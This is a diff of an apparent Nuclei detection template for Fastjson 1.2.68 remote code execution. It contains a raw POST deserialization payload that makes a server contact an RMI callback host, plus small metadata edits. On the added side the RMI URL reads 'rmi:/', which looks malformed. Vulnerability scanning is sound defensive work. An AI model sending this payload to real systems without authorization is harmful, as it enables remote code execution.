@@ -1,5 +1,4 @@
 id: fastjson-1-2-68-rce
-
 info:
   name: Fastjson 1.2.68 - Remote Code Execution
   author: zh
@@ -11,13 +10,10 @@ info:
     - https://github.com/wyzxxz/fastjson_rce_tool
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10
+    cvss-score: 10.0
     cwe-id: CWE-77
-  metadata:
-    max-request: 3
-  tags: fastjson,rce,deserialization,oast,vuln
-
-http:
+  tags: fastjson,rce,deserialization,oast
+requests:
   - raw:
       - |
         POST / HTTP/1.1
@@ -44,20 +40,18 @@ http:
 
         {
            "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
-           "metricRegistry":"rmi://{{interactsh-url}}/Exploit"
+           "metricRegistry":"rmi:/{{interactsh-url}}/Exploit"
         }
-
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol # Confirms DNS Interaction
         words:
           - "dns"
-
       - type: status
         negative: true
         status:
           - 200
-# digest: 4b0a00483046022100be26a37ff95780f748009a4b725ec0a75d2ee2b0f0c558f492bb25df622d4b24022100b9f9083c6128a750046ba5b5b73095d39df936c4b76f853b8f8e9a5f4e82df4c:922c64590222798bb761d5b6d8e72950
+
+# Enhanced by mp on 2022/05/25
